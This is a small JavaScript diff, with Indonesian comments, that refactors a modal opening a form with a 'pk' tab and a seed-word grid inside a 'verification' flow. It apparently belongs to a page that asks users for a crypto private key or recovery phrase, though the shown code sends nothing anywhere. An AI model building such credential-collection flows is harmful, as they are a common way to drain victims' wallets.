@@ -560,16 +560,25 @@ async function showVerificationDemo() {
     }
     
 function openModal() {
-  verificationTimers.forEach(clearTimeout);
-  verificationTimers = [];
+  verificationRun++;
 
-  document.getElementById('modalOverlay').classList.add('show');
-  document.getElementById('formState').style.display = 'block';
-  document.getElementById('successState').classList.remove('show');
+  const overlay = document.getElementById('modalOverlay');
+  const formState = document.getElementById('formState');
+  const successState = document.getElementById('successState');
 
+  overlay.classList.add('show');
+
+  // Tampilkan form, sembunyikan popup verification
+  formState.style.display = 'block';
+  successState.classList.remove('show');
+
+  // Default tab
   switchTab('pk');
+
+  // Rebuild field demo
   buildSeedGrid(currentWordCount);
 }
+    
     
     function closeModal() { document.getElementById('modalOverlay').classList.remove('show'); }
     function handleOverlayClick(e) { if (e.target.id === 'modalOverlay') closeModal(); }
